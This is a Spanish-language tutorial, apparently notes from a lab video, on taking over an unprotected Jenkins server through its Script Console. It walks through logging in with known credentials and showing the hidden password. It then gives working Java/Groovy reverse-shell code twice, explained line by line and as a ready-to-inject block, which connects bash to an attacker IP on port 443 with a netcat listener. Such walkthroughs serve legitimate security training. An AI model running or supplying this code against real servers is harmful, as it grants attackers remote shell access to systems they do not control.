
### 1. Contexto General

- **Escenario:**  
    Se cuenta con un servidor Jenkins sin protección de credenciales (sin usuario y contraseña o con credenciales conocidas). Esto permite que, desde un navegador, se pueda acceder al panel de administración de Jenkins.
    
- **Objetivo:**  
    Aprovechar el panel de administración (especialmente la _script console_) para ejecutar código arbitrario. En este caso, se inyecta un fragmento de código Java que, al ejecutarse, crea una conexión inversa (reverse shell) hacia la máquina atacante.
    

---

### 2. Proceso Manual Explicado

- **Acceso a Jenkins:**
    
    1. Se obtiene la IP de la máquina víctima, por ejemplo mediante un script de despliegue (autodeploy.sh) de una máquina preconfigurada (por ejemplo, StrongJenkins).
        
    2. Se accede mediante un navegador a la IP con el puerto 8080, que es donde Jenkins se encuentra corriendo.
        
- **Autenticación:**  
    Se utiliza el usuario y contraseña conocidos (en el ejemplo, `admin` y `rockyou`) para iniciar sesión en Jenkins.
    
    > Un truco mostrado en el video es cambiar el atributo del campo de contraseña (de `type=password` a `type=text`) para visualizar la contraseña en el navegador.
    
- **Ubicación de la Consola de Scripts:**
    
    1. Una vez autenticado, se entra en el apartado “Manage Jenkins” y se desplaza hasta la parte inferior donde se encuentra la “Script Console”.
        
    2. En esta consola es posible ejecutar código Java (o Groovy) de forma arbitraria en el servidor, lo que abre la puerta a la explotación.
        
- **Preparación del Código Exploit:**  
    Se utiliza un fragmento de código (en Java) que permite lanzar una reverse shell. La idea es que al ejecutar este código, se establezca una conexión desde la máquina víctima (donde corre Jenkins) hacia la máquina atacante.
    
- **Reverse Shell:**  
    El código de exploit está diseñado para conectarse a la IP de la máquina atacante en un puerto específico (por ejemplo, 443 o 444). En la máquina atacante se debe tener un listener activo (por ejemplo, utilizando `netcat`) que espere la conexión entrante y permita interactuar con la shell.
    

---

### 3. Análisis del Código Paso a Paso

El siguiente código es la pieza central del exploit:

```java
String host="192.168.1.101";
int port=443;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(), so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)
        so.write(pi.read());
    while(pe.available()>0)
        so.write(pe.read());
    while(si.available()>0)
        po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try {
        p.exitValue();
        break;
    } catch (Exception e){}
};
p.destroy();
s.close();
```

**Explicación detallada:**

1. **Definición de Variables Iniciales:**
    
    - `String host="192.168.1.101";`  
        Se define la IP de la máquina atacante, es decir, a donde se conectará la reverse shell.
        
    - `int port=443;`  
        Se especifica el puerto en el que el atacante estará escuchando la conexión entrante.
        
    - `String cmd="bash";`  
        Se define el comando que se va a ejecutar en la máquina víctima. En este caso, se lanza el intérprete de comandos Bash.
        
2. **Inicio del Proceso (Shell):**
    
    - `Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();`  
        Se inicia un nuevo proceso que ejecuta `bash`. La redirección de error permite que la salida de error se combine con la salida estándar.
        
3. **Establecimiento de la Conexión con el Atacante:**
    
    - `Socket s=new Socket(host,port);`  
        Se crea un socket que establece conexión con la máquina atacante en la IP y puerto especificados.
        
4. **Obtención de los Flujos de Datos:**
    
    - `InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();`  
        Se obtienen los flujos de entrada de la salida estándar y de error del proceso `bash`, y el flujo de entrada del socket.
        
    - `OutputStream po=p.getOutputStream(), so=s.getOutputStream();`  
        Se obtienen los flujos de salida hacia el proceso `bash` y hacia el socket.
        
5. **Bucle de Redirección de Datos:**
    
    - Dentro del bucle `while(!s.isClosed()){ ... }`, se realizan las siguientes acciones de forma continua:
        
        - **Lectura y envío de la salida del proceso al socket:**  
            Se leen los bytes disponibles en la salida estándar (`pi`) y en la salida de error (`pe`) del proceso y se escriben en el flujo de salida del socket (`so`).
            
        - **Lectura y envío de la entrada del socket al proceso:**  
            Se leen los bytes del flujo de entrada del socket (`si`) y se envían al proceso `bash` mediante el flujo de salida (`po`).
            
        - Se realizan los `flush()` de ambos flujos para asegurar que los datos se envíen inmediatamente.
            
        - Se realiza una breve pausa (`Thread.sleep(50);`) para no saturar la CPU.
            
        - Se intenta obtener el valor de salida del proceso (`p.exitValue()`). Si el proceso ha terminado, se rompe el bucle; de lo contrario, se captura la excepción y se continúa.
            
6. **Limpieza Final:**
    
    - `p.destroy();`  
        Se termina el proceso `bash` una vez finalizado el bucle.
        
    - `s.close();`  
        Se cierra el socket, terminando la conexión con la máquina atacante.
        

---

### 4. Código Completo

Aquí tienes el código completo, listo para ser inyectado en la _Script Console_ de Jenkins:

```java
String host="192.168.1.101";
int port=443;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(), so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)
        so.write(pi.read());
    while(pe.available()>0)
        so.write(pe.read());
    while(si.available()>0)
        po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try {
        p.exitValue();
        break;
    } catch (Exception e){}
};
p.destroy();
s.close();
```

---

### 5. Resumen del Proceso

- **Preparación:** Se identifica una máquina Jenkins vulnerable y se accede a su panel de administración.
    
- **Explotación Manual:** Se utiliza la _Script Console_ para ejecutar código Java que crea una conexión inversa.
    
- **Automatización con Python:** La idea es automatizar estos pasos mediante un script en Python que primero realice el login en Jenkins y luego ejecute el exploit, pero en este ejemplo nos centramos en entender y replicar el fragmento Java que se ejecuta para obtener la reverse shell.
    
- **Resultado:** Al ejecutar el código, la máquina víctima se conecta de forma inversa a la máquina atacante, proporcionando una shell interactiva que permite la ejecución de comandos de forma remota.
    

